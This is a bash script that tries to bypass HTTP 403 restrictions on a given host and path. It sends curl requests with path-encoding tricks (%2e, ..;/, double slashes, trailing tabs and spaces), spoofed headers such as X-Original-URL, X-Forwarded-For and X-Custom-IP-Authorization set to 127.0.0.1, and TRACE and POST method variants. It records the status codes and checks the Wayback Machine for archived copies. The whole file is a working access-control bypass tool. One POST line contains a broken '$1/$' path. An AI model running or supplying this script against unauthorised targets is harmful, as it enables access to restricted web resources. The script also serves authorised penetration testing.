#! /bin/bash
echo " " > 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2 >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2 >> 403BypasscheckResult.txt
echo "  --> ${1}/%2e/${2}" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/. >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}/." >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2// >> 403BypasscheckResult.txt
echo "  --> ${1}//${2}//" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./ >> 403BypasscheckResult.txt
echo "  --> ${1}/./${2}/./" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2 >> 403BypasscheckResult.txt
echo "  --> ${1}/${2} -H X-Original-URL: ${2}" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2 >> 403BypasscheckResult.txt
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2 >> 403BypasscheckResult.txt
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2 >> 403BypasscheckResult.txt
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1 >> 403BypasscheckResult.txt
echo "  --> ${1} -H X-rewrite-url: ${2}" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20 >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}%20" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09 >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}%09" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2? >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}?" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}.html" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}/?anything" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2# >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}#" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$ >> 403BypasscheckResult.txt
echo "  --> ${1}/${2} -H Content-Length:0 -X POST" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/* >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}/*" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}.php" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}.json" >> 403BypasscheckResult.txt
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2 >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}  -X TRACE" >> 403BypasscheckResult.txt
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2 >> 403BypasscheckResult.txt
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1" >> 403BypasscheckResult.txt
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/" >> 403BypasscheckResult.txt
echo "  --> ${1}/${2}..;/" >> 403BypasscheckResult.txt
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/" >> 403BypasscheckResult.txt
echo "  --> ${1}/${2};/" >> 403BypasscheckResult.txt
#updated
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2 >> 403BypasscheckResult.txt
echo "  --> ${1}/${2} -X TRACE" >> 403BypasscheckResult.txt
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2 >> 403BypasscheckResult.txt
echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1" >> 403BypasscheckResult.txt
echo "Way back machine:" >> 403BypasscheckResult.txt
curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}' >> 403BypasscheckResult.txt